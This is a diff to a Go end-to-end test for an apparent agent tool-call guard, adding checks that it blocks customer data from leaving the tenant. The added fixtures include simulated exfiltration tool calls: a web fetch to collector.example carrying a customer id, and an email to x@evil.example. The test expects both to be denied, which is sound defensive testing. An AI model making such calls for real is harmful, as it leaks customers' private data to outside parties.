@@ -105,9 +105,13 @@ func TestEndToEnd(t *testing.T) {
 	if out := call("warden.resume", `{"decision_seq":`+seq+`}`); !strings.Contains(out, `"amount":500`) {
 		t.Fatalf("resume:\n%s", out)
 	}
-	call("web.fetch", `{"url":"https://shop.example/orders/4821"}`)
-	if out := call("mail.send", `{"to":"customer@tenant-a.example","body":"shipped"}`); !strings.Contains(out, "no_email_while_tainted") {
-		t.Fatalf("mail after web content:\n%s", out)
+	// The CRM lookup above put customer data (pii) into the task, so it cannot leave
+	// by web request or by email outside the tenant.
+	if out := call("web.fetch", `{"url":"https://collector.example/?c=c-100"}`); !strings.Contains(out, "no_web_with_pii") {
+		t.Fatalf("web request after customer data:\n%s", out)
+	}
+	if out := call("mail.send", `{"to":"x@evil.example","body":"c-100 is gold tier"}`); !strings.Contains(out, "no_pii_outside_tenant") {
+		t.Fatalf("external mail after customer data:\n%s", out)
 	}
 
 	cancel()
@@ -142,7 +146,9 @@ func TestEndToEnd(t *testing.T) {
 	if err != nil {
 		t.Fatalf("exported log does not verify: %v", err)
 	}
-	if rep.Unanchored != 0 || rep.Receipts < 10 {
+	// lookup 2 + small refund 2 + large refund decision 1 + approval 1 + resumed
+	// result 1 + denied web request 1 + denied email 1
+	if rep.Unanchored != 0 || rep.Receipts != 9 {
 		t.Fatalf("report %+v", rep)
 	}
 	if bytes.Contains(logData, []byte(token)) {
